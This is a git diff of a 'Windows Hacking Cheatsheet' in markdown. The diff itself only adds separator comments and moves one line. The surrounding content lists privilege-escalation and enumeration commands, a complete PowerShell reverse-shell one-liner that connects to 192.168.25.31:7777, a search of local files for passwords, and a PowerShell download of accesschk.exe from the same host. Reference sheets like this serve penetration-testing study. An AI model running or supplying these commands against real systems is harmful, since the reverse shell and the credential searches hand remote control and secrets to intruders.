@@ -1,5 +1,10 @@
 # WINDOWS HACKING CHEATSHEET
 
+<!--
+##################################################
+##################################################
+-->
+
 ## System Enumeration
 
 ### Show Patches
@@ -18,9 +23,6 @@
 
 `where /r c:\Windows *.exe *.dll`
 
-### Search long output
-`command |more`
-
 ### Find Unquoted service paths
 `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
 
@@ -29,6 +31,11 @@
 
 ### Show execution policy
 `Get-ExecutionPolicy -List | Format-table -AutoSize`
+
+<!--
+##################################################
+##################################################
+-->
 
 ## User Enumeration
 
@@ -44,10 +51,20 @@
 ### Show info on specified user
 `net user administrator`
 
+<!--
+##################################################
+##################################################
+-->
+
 ## Network Enumeration
 
 ### Show Routing table
 `route print`
+
+<!--
+##################################################
+##################################################
+-->
 
 ## Shells
 
@@ -55,6 +72,11 @@
 ```
 $client = New-Object System.Net.Sockets.TCPClient("192.168.25.31",7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+
+<!--
+##################################################
+##################################################
+-->
 
 ## Passwords
 
@@ -69,6 +91,11 @@ _USERNAME:SID:LM(BLANK=aad3b435b51404eeaad3b435b51404ee):NTLM:::_
 
 ### Find file containing keyword
 `findstr /si password *.txt | *.xml | *.xls`
+
+<!--
+##################################################
+##################################################
+-->
 
 ## Useful Commands
 
@@ -89,3 +116,6 @@ _USERNAME:SID:LM(BLANK=aad3b435b51404eeaad3b435b51404ee):NTLM:::_
 
 ### Download via windows CMD
 `powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.25.31/privesc/accesschk.exe','C:\Users\GitService\Desktop\accesschk.exe')`
+
+### Search long output
+`command |more`
